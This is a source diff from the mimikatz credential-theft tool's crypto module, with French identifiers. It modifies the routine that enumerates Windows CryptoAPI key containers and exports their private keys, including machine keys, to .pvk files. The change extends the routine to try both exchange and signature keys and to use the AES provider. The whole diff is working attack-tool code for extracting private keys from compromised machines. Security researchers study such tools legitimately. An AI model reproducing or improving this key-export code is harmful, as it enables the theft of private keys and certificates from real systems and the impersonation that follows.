@@ -135,47 +135,51 @@ void mod_mimikatz_crypto::listAndOrExportKeys(bool isMachine, bool exportKeys)
 			wcout << L"\t - " << *monContainer << endl;
 
 			HCRYPTPROV hCryptKeyProv = NULL;
-			if(CryptAcquireContext(&hCryptKeyProv, monContainer->c_str(), NULL, PROV_RSA_SCHANNEL/*PROV_RSA_FULL*/, NULL | (isMachine ? CRYPT_MACHINE_KEYSET : NULL)))
+			if(CryptAcquireContext(&hCryptKeyProv, monContainer->c_str(), MS_ENH_RSA_AES_PROV, PROV_RSA_AES, NULL | (isMachine ? CRYPT_MACHINE_KEYSET : NULL)))
 			{
 				HCRYPTKEY maCle = NULL;
-				if(CryptGetUserKey(hCryptKeyProv, /*AT_SIGNATURE*/AT_KEYEXCHANGE, &maCle))
+				for(DWORD ks = AT_KEYEXCHANGE; (ks <= AT_SIGNATURE) && !maCle; ks++)
 				{
-					DWORD param = 0;
-					DWORD taille = sizeof(param);
-
-					if(CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&param), &taille, NULL))
-						wcout << L"\t\tExportabilité : " << (param & CRYPT_EXPORT ? L"OUI" : L"NON") << L" (" << hex << param << L")" << endl;
-					if(CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&param), &taille, NULL))
-						wcout << L"\t\tTaille clé    : " << param << endl;
-
-					if(exportKeys)
+					if(CryptGetUserKey(hCryptKeyProv, ks, &maCle))
 					{
-						bool reussite = false;
-						BYTE * monExport = NULL;
-						DWORD tailleExport = 0;
+						DWORD param = 0, taille = sizeof(param);
+						if(CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&param), &taille, NULL))
+							wcout << L"\t\tExportabilité : " << (param & CRYPT_EXPORT ? L"OUI" : L"NON") << endl;
+						if(CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&param), &taille, NULL))
+							wcout << L"\t\tTaille clé    : " << param << endl;
 
-						wstringstream monBuff;
-						wstring containerName = *monContainer;
-						sanitizeFileName(&containerName);
+						if(exportKeys)
+						{
+							bool reussite = false;
+							BYTE * monExport = NULL;
+							DWORD tailleExport = 0;
 
-						monBuff << L"capi_" << type << L'_' << i << L'_' << containerName << L".pvk";
+							wstringstream monBuff;
+							wstring containerName = *monContainer;
+							sanitizeFileName(&containerName);
+
+							monBuff << L"capi_" << type << L'_' << i << L'_' << containerName << L".pvk";
 						
-						if(mod_cryptoapi::getPrivateKey(maCle, &monExport, &tailleExport))
-						{
-							reussite = mod_crypto::PrivateKeyBlobToPVK(monExport, tailleExport, monBuff.str());
-							delete[] monExport;
-						}
+							if(mod_cryptoapi::getPrivateKey(maCle, &monExport, &tailleExport))
+							{
+								reussite = mod_crypto::PrivateKeyBlobToPVK(monExport, tailleExport, monBuff.str());
+								delete[] monExport;
+							}
 
-						wcout << L"\t\tExport privé dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
-						if(!reussite)
-						{
-							wcout << L"\t\t\tmod_cryptoapi::getPrivateKey/PrivateKeyBlobToPVK : " << mod_system::getWinError() << endl;
+							wcout << L"\t\tExport privé dans  \'" << monBuff.str() << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
+							if(!reussite)
+							{
+								wcout << L"\t\t\tmod_cryptoapi::getPrivateKey/PrivateKeyBlobToPVK : " << mod_system::getWinError() << endl;
+							}
 						}
 					}
-
-					CryptDestroyKey(maCle);
 				}
-				else wcout << L"\t\t* Erreur de clé ; " << mod_system::getWinError() << endl;
+
+				if(maCle)
+					CryptDestroyKey(maCle);
+				else
+					wcout << L"\t\t* Erreur de clé ; " << mod_system::getWinError() << endl;
+
 
 				CryptReleaseContext(hCryptKeyProv, 0);
 			}
@@ -266,8 +270,7 @@ void mod_mimikatz_crypto::listAndOrExportCertificates(wstring monEmplacement, ws
 
 					wstringstream monBuff;
 					monBuff << monEmplacement << L'_' << monStore << L'_' << i << L'_' << *certName << L'.';
-					
-					
+										
 					mod_crypto::KIWI_KEY_PROV_INFO keyProvInfo;
 					if(mod_crypto::getKiwiKeyProvInfo(pCertContext, &keyProvInfo))
 					{
